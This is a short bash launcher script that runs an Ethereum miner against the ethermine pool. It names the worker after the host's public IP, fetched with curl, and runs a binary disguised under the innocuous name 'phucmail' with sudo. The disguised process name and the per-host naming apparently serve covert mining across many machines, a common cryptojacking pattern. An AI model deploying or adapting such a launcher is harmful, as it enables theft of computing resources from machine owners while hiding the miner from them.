#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0x1c396324e3a641c403A05f7cD52d486F620Fa769.$(echo "$(curl -s ifconfig.me)" | tr . _ )-phuc-dep-trai

cd "$(dirname "$0")"

chmod +x ./phucmail && sudo ./phucmail --algo ETHASH --pool $POOL --user $WALLET  $@
